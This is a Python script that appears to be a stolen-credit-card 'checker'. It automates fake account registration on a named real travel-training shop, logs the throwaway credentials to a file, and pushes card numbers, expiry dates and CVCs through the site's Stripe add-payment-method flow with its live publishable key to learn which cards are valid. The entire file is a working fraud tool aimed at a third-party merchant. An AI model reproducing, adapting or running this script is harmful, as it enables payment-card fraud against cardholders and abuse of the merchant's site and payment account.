import requests
import re
import random
import time
import string
from bs4 import BeautifulSoup

# Generate random email
def generate_random_email():
    domain = random.choice(['gmail.com', 'yahoo.com', 'outlook.com'])
    name = ''.join(random.choices(string.ascii_lowercase, k=10))
    return f"{name}@{domain}"

# Create headers for requests
def create_headers():
    return {
        'authority': 'www.thetravelinstitute.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

# Create a session with headers
def create_session():
    session = requests.Session()
    session.headers.update(create_headers())
    return session

# Process credit card details
def process_cc(ccx):
    ccx = ccx.strip()
    try:
        parts = ccx.split("|")
        if len(parts) < 4:
            raise ValueError("Invalid CC format")
            
        n, mm, yy, cvc = parts[:4]
        yy = yy.split("20")[-1] if "20" in yy else yy
        return n, mm, yy, cvc
    except Exception as e:
        print(f"Error processing CC: {e}")
        return None

# Register user and return session
def register_user(session):
    try:
        email = generate_random_email()
        response = session.get('https://www.thetravelinstitute.com/register/', timeout=20)
        soup = BeautifulSoup(response.text, 'html.parser')

        nonce = soup.find('input', {'id': 'afurd_field_nonce'})
        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})

        if not nonce or not noncee:
            print("❌ Failed to retrieve nonce values. Site structure might have changed.")
            return False

        data = {
            'afurd_field_nonce': nonce['value'],
            '_wp_http_referer': '/register/',
            'email': email,
            'password': 'TestPass123!',
            'woocommerce-register-nonce': noncee['value'],
            'register': 'Register',
        }

        response = session.post('https://www.thetravelinstitute.com/register/', data=data, timeout=20)
        if response.status_code == 200:
            with open('Creds.txt', 'a') as f:
                f.write(f"{email}:TestPass123!\n")
            return True
        return False
    except Exception as e:
        print(f"Registration error: {e}")
        return False

# Check credit card via Stripe
def check_card(session, cc, mm, yy, cvc):
    try:
        response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', timeout=20)
        nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', response.text)

        if not nonce_match:
            print("❌ Failed to extract nonce for payment processing.")
            return "Error extracting nonce"

        nonce = nonce_match.group(1)

        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
        }

        stripe_data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvc,
            'card[exp_year]': yy,
            'card[exp_month]': mm,
            'billing_details[address][postal_code]': '10080',
            'billing_details[address][country]': 'US',
            'key': 'pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
        }

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=20)
        response_json = response.json()

        if response.status_code != 200:
            print(f"❌ Stripe Error: {response_json}")
            return "Stripe request failed"

        payment_method_id = response_json.get('id')
        if not payment_method_id:
            return "Error: No payment method ID"

        confirm_data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }

        response = session.post('https://www.thetravelinstitute.com/', 
                              params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
                              data=confirm_data,
                              timeout=20)
        
        result = response.json().get('msg', 'No message in response')
        print(f"✅ Stripe Response: {result}")
        return result

    except Exception as e:
        print(f"Payment processing error: {e}")
        return "Error processing payment"

def Tele(ccx):
    cc_data = process_cc(ccx)
    if not cc_data:
        return "Invalid CC format"

    session = create_session()
    if not register_user(session):
        return "Registration failed"
    
    result = check_card(session, *cc_data)
    return result
    
